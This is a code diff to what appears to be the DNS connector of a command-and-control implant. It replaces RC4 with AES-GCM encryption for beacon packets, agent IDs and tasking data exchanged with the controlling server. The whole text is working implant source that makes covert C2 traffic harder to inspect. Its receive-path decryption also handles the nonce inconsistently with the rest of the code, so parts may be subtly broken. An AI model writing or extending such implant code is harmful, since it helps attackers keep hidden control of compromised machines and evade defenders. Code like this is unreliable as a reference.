@@ -815,9 +815,11 @@ BOOL ConnectorDNS::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
         return FALSE;
     memcpy(beatCopy, beat, beatSize);
 
-    EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);
+	AESGCMDecrypt(beatCopy + GCM_NONCE_SIZE, beatSize - GCM_NONCE_SIZE - GCM_TAG_SIZE, this->encryptKey,
+	              beatCopy, beatCopy,
+	              beatCopy + beatSize - GCM_TAG_SIZE);
 
-    ULONG agentId = (beatSize >= 8) ? ReadBE32(beatCopy + 4) : 0;
+	ULONG agentId = (beatSize >= 8) ? ReadBE32(beatCopy + 4) : 0;
     MemFreeLocal((LPVOID*)&beatCopy, beatSize);
 
     ApiWin->snprintf(this->sid, sizeof(this->sid), "%08x", agentId);
@@ -951,14 +953,19 @@ void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
             sessionBuf[3] = (BYTE)((plainSize >> 16) & 0xFF);
             sessionBuf[4] = (BYTE)((plainSize >> 24) & 0xFF);
             memcpy(sessionBuf + 5, payload, payloadLen);
-            EncryptRC4(sessionBuf, (int)sessionLen, sessionKey, 16);
-            sendBuf = sessionBuf;
-            sendLen = sessionLen;
+
+            ULONG encLen = GCM_NONCE_SIZE + sessionLen + GCM_TAG_SIZE;
+            sendBuf = (BYTE*)MemAllocLocal(encLen);
+            AESGCMEncrypt(sessionBuf, sessionLen, sessionKey,
+                          sendBuf, sendBuf+GCM_NONCE_SIZE, sendBuf+GCM_NONCE_SIZE+sessionLen);
+            sendLen = encLen;
         }
         else {
-            EncryptRC4(plainData, (int)plainSize, sessionKey, 16);
-            sendBuf = plainData;
-            sendLen = plainSize;
+            ULONG encLen = GCM_NONCE_SIZE + plainSize + GCM_TAG_SIZE;
+            sendBuf = (BYTE*)MemAllocLocal(encLen);
+            AESGCMEncrypt(plainData, plainSize, sessionKey,
+                          sendBuf, sendBuf+GCM_NONCE_SIZE, sendBuf+GCM_NONCE_SIZE+plainSize);
+            sendLen = encLen;
         }
 
         this->SendData(sendBuf, sendLen);
@@ -974,6 +981,8 @@ void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
             }
         }
 
+        if (sendBuf)
+            MemFreeLocal((LPVOID*)&sendBuf, sendLen);
         if (sessionBuf)
             MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
 
@@ -985,8 +994,20 @@ void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
     }
 
     // Decrypt received data with session key
-    if (this->recvSize > 0 && this->recvData) {
-        DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
+    if (this->recvSize > (int)(GCM_NONCE_SIZE + GCM_TAG_SIZE) && this->recvData) {
+        int plainLen = this->recvSize - GCM_NONCE_SIZE - GCM_TAG_SIZE;
+        BYTE* plainBuf = (BYTE*)MemAllocLocal(plainLen);
+        if (plainBuf) {
+            if (AESGCMDecrypt(this->recvData, plainLen, sessionKey,
+                              this->recvData, plainBuf,
+                              this->recvData + this->recvSize - GCM_TAG_SIZE)) {
+                MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
+                this->recvData = plainBuf;
+                this->recvSize = plainLen;
+            } else {
+                MemFreeLocal((LPVOID*)&plainBuf, (ULONG)plainLen);
+            }
+        }
     }
 }
 
